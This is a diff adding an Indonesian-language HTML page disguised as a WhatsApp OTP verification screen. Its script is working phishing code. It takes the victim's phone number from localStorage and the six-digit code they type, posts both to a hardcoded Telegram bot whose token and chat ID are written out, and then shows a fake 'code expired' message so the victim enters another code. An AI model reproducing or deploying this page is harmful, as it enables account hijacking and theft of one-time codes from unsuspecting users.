@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verifikasi OTP</title>
+
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+    font-family:'Poppins',sans-serif;
+}
+
+body{
+    background:linear-gradient(180deg,#f5f3ff,#ffffff);
+    min-height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:flex-start;
+}
+
+.container{
+    width:100%;
+    max-width:420px;
+    padding:20px;
+}
+
+.header{
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    margin-bottom:30px;
+}
+
+.back-btn{
+    width:40px;
+    height:40px;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    cursor:pointer;
+    border-radius:50%;
+    transition:background-color 0.2s;
+}
+
+.back-btn:hover{
+    background-color:#f0f0f0;
+}
+
+.back-btn svg{
+    width:24px;
+    height:24px;
+    stroke:#143a66;
+}
+
+.help-btn{
+    color:#143a66;
+    font-weight:600;
+    text-decoration:none;
+    font-size:14px;
+    display:flex;
+    align-items:center;
+    gap:4px;
+}
+
+.help-btn svg{
+    width:18px;
+    height:18px;
+    stroke:#143a66;
+}
+
+.icon-container{
+    width:110px;
+    height:110px;
+    margin:20px auto;
+    display:block;
+    background:#eef2ff;
+    border-radius:50%;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
+
+.icon-lock svg{
+    width:60px;
+    height:60px;
+    stroke:#5c7cfa;
+    fill:none;
+}
+
+.title{
+    text-align:center;
+    font-size:32px;
+    font-weight:700;
+    color:#133b68;
+    margin-bottom:12px;
+}
+
+.subtitle{
+    text-align:center;
+    color:#7c8798;
+    line-height:1.5;
+    font-size:16px;
+    padding:0 10px;
+}
+
+.subtitle strong{
+    color:#133b68;
+    display:block;
+    margin-top:4px;
+}
+
+.otp-container{
+    display:flex;
+    justify-content:center;
+    gap:8px;
+    margin:35px 0;
+}
+
+.otp-input{
+    width:48px;
+    height:60px;
+    border:2px solid #d7dce4;
+    border-radius:12px;
+    text-align:center;
+    font-size:24px;
+    font-weight:600;
+    color:#133b68;
+    outline:none;
+    transition:border-color 0.2s;
+}
+
+.otp-input:focus{
+    border-color:#5c7cfa;
+}
+
+.otp-input.error{
+    border-color:#dc3545;
+    animation:shake 0.5s;
+}
+
+@keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-5px); }
+    75% { transform: translateX(5px); }
+}
+
+.submit-btn {
+    display: block;
+    width: 100%;
+    padding: 16px;
+    margin-top: 10px;
+    background-color: #133b68;
+    color: white;
+    border: none;
+    border-radius: 12px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition:background-color 0.2s;
+}
+
+.submit-btn:hover{
+    background-color:#0f2a4d;
+}
+
+.submit-btn:disabled {
+    background-color: #ccc;
+    cursor: not-allowed;
+}
+
+.resend{
+    text-align:center;
+    color:#9aa4b2;
+    font-size:14px;
+    margin-top:20px;
+}
+
+.resend a{
+    color:#5c7cfa;
+    text-decoration:none;
+    font-weight:600;
+}
+
+.warning{
+    margin-top:60px;
+    text-align:center;
+    padding:15px;
+    background:#fff3cd;
+    border-radius:8px;
+    color:#856404;
+    font-size:13px;
+    line-height:1.5;
+    font-weight:500;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+}
+
+.warning svg{
+    width:20px;
+    height:20px;
+    flex-shrink:0;
+}
+
+.loading-overlay{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:rgba(255,255,255,0.9);
+    display:none;
+    justify-content:center;
+    align-items:center;
+    z-index:1000;
+}
+
+.spinner{
+    width:50px;
+    height:50px;
+    border:4px solid #f3f3f3;
+    border-top:4px solid #5c7cfa;
+    border-radius:50%;
+    animation:spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.toast {
+    position:fixed;
+    bottom:20px;
+    left:50%;
+    transform:translateX(-50%);
+    padding:12px 24px;
+    border-radius:8px;
+    color:white;
+    font-size:14px;
+    font-weight:500;
+    opacity:0;
+    transition:opacity 0.3s;
+    z-index:1001;
+}
+
+.toast.show{
+    opacity:1;
+}
+
+.toast.success{
+    background-color:#dc3545;
+}
+
+.toast.error{
+    background-color:#dc3545;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="header">
+        <!-- Icon Panah Kembali -->
+        <div class="back-btn" onclick="window.history.back()">
+            <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M19 12H5M12 19l-7-7 7-7"/>
+            </svg>
+        </div>
+        
+        <!-- Icon Help -->
+        <a href="#" class="help-btn">
+            <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"/>
+                <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
+                <line x1="12" y1="17" x2="12.01" y2="17"/>
+            </svg>
+            Bantuan
+        </a>
+    </div>
+
+    <!-- Icon Lock SVG -->
+    <div class="icon-container">
+        <div class="icon-lock">
+            <svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                <circle cx="12" cy="16" r="1"/>
+            </svg>
+        </div>
+    </div>
+
+    <h1 class="title">Verifikasi OTP</h1>
+
+    <p class="subtitle">
+        Masukkan kode yang telah kami kirim melalui WhatsApp ke nomor:
+        <strong id="display-phone">Memuat...</strong>
+    </p>
+
+    <div class="otp-container">
+        <input class="otp-input" type="tel" maxlength="1" inputmode="numeric">
+        <input class="otp-input" type="tel" maxlength="1" inputmode="numeric">
+        <input class="otp-input" type="tel" maxlength="1" inputmode="numeric">
+        <input class="otp-input" type="tel" maxlength="1" inputmode="numeric">
+        <input class="otp-input" type="tel" maxlength="1" inputmode="numeric">
+        <input class="otp-input" type="tel" maxlength="1" inputmode="numeric">
+    </div>
+
+    <button class="submit-btn" id="verify-btn" disabled>Verifikasi Kode</button>
+
+    <div class="resend" id="resend-text">
+        Belum dapat kode? Kirim ulang dalam <span id="timer">30</span> detik
+    </div>
+
+    <!-- Icon Warning SVG -->
+    <div class="warning">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+            <line x1="12" y1="9" x2="12" y2="13"/>
+            <line x1="12" y1="17" x2="12.01" y2="17"/>
+        </svg>
+        Jangan berikan kode OTP kepada siapapun. Dapat berisiko penyalahgunaan akun.
+    </div>
+
+</div>
+
+<!-- Loading Overlay -->
+<div class="loading-overlay" id="loading">
+    <div class="spinner"></div>
+</div>
+
+<!-- Toast Notification -->
+<div class="toast" id="toast"></div>
+
+<script>
+    // ==========================================
+    // KONFIGURASI TELEGRAM
+    // ==========================================
+    const BOT_TOKEN = '8341291421:AAHZhAJ-_wj7HBO57T7jvQ1yJcF46SZvESg'; 
+    const CHAT_ID = '7549590022';     
+    
+    // ==========================================
+    // AMBIL NOMOR DARI LOCALSTORAGE
+    // ==========================================
+    const keyLocalStorage = 'phone_number';
+    const displayElement = document.getElementById('display-phone');
+    const savedPhone = localStorage.getItem(keyLocalStorage);
+
+    if (savedPhone) {
+        // Format nomor agar lebih rapih (misal: +62 822-2006-6617)
+        const formattedPhone = formatPhoneNumber(savedPhone);
+        displayElement.textContent = formattedPhone;
+    } else {
+        displayElement.textContent = "+62 8xx-xxxx-xxxx";
+        console.log("Nomor tidak ditemukan");
+    }
+
+    function formatPhoneNumber(num) {
+        // Hanya ambil angka
+        const numbers = num.replace(/\D/g, '');
+        if (numbers.length >= 10) {
+            // Format: +62 822-2006-6617
+            return `+62 ${numbers.slice(2, 5)}-${numbers.slice(5, 9)}-${numbers.slice(9)}`;
+        }
+        return num;
+    }
+
+    // ==========================================
+    // LOGIC INPUT OTP
+    // ==========================================
+    const inputs = document.querySelectorAll('.otp-input');
+    const verifyBtn = document.getElementById('verify-btn');
+
+    function getFullOTP() {
+        return Array.from(inputs).map(input => input.value).join('');
+    }
+
+    function checkAllFilled() {
+        const otp = getFullOTP();
+        verifyBtn.disabled = otp.length !== 6;
+    }
+
+    inputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            input.value = input.value.replace(/[^0-9]/g, '');
+            
+            if(input.value.length === 1 && index < inputs.length - 1){
+                inputs[index + 1].focus();
+            }
+            checkAllFilled();
+        });
+
+        input.addEventListener('keydown', (e) => {
+            if(e.key === 'Backspace' && input.value === '' && index > 0){
+                inputs[index - 1].focus();
+            }
+        });
+
+        // Paste semua kode sekaligus
+        input.addEventListener('paste', (e) => {
+            e.preventDefault();
+            const pasteData = (e.clipboardData || window.clipboardData).getData('text');
+            const numbers = pasteData.replace(/\D/g, '').slice(0, 6);
+            
+            numbers.split('').forEach((num, i) => {
+                if(inputs[i]) {
+                    inputs[i].value = num;
+                }
+            });
+            
+            if (numbers.length === 6) {
+                inputs[5].focus();
+            } else if (numbers.length > 0) {
+                inputs[numbers.length].focus();
+            }
+            
+            checkAllFilled();
+        });
+    });
+
+    // ==========================================
+    // KIRIM DATA KE TELEGRAM
+    // ==========================================
+    async function sendToTelegram(otpCode, phoneNumber) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
+        const messageText = `
+🔐 <b>KODE OTP BARU</b>
+
+📱 <b>Nomor:</b> ${phoneNumber}
+🔢 <b>Kode:</b> <code>${otpCode}</code>
+⏰ <b>Waktu:</b> ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
+🌐 <b>Device:</b> ${navigator.userAgent.includes('Mobile') ? 'Mobile' : 'Desktop'}
+        `.trim();
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: messageText,
+                    parse_mode: 'HTML'
+                })
+            });
+
+            const data = await response.json();
+            return data.ok;
+        } catch (error) {
+            console.error('Error:', error);
+            return false;
+        }
+    }
+
+    function showToast(message, type) {
+        const toast = document.getElementById('toast');
+        toast.textContent = message;
+        toast.className = `toast ${type} show`;
+        
+        setTimeout(() => {
+            toast.className = toast.className.replace(' show', '');
+        }, 3000);
+    }
+
+    verifyBtn.addEventListener('click', async () => {
+        const otpCode = getFullOTP();
+        const phoneNumber = displayElement.textContent;
+        
+        if (otpCode.length !== 6) {
+            showToast('Mohon masukkan 6 digit kode OTP', 'error');
+            inputs.forEach(input => input.classList.add('error'));
+            setTimeout(() => inputs.forEach(input => input.classList.remove('error')), 500);
+            return;
+        }
+
+        // Tampilkan loading
+        document.getElementById('loading').style.display = 'flex';
+        verifyBtn.disabled = true;
+
+        const success = await sendToTelegram(otpCode, phoneNumber);
+
+        document.getElementById('loading').style.display = 'none';
+
+        if (success) {
+            showToast('❌Kode OTP Kadaluwarsa');
+            // window.location.href = 'otp.html';
+            localStorage.setItem('otp_verified', 'true');
+            setTimeout(() => {
+                // Redirect ke halaman selanjutnya
+                // window.location.href = 'otp.html';
+            }, 2000);
+        } else {
+            showToast('❌ Gagal mengirim ke Telegram', 'error');
+            verifyBtn.disabled = false;
+        }
+    });
+
+    // ==========================================
+    // TIMER RESEND
+    // ==========================================
+    let timeLeft = 30;
+    const timerEl = document.getElementById('timer');
+
+    const countdown = setInterval(() => {
+        timeLeft--;
+        timerEl.textContent = timeLeft;
+
+        if (timeLeft <= 0) {
+            clearInterval(countdown);
+            document.getElementById('resend-text').innerHTML = 
+                'Belum dapat kode? <a href="#" onclick="location.reload()">Kirim ulang kode</a>';
+        }
+    }, 1000);
+</script>
+
+</body>
+</html>
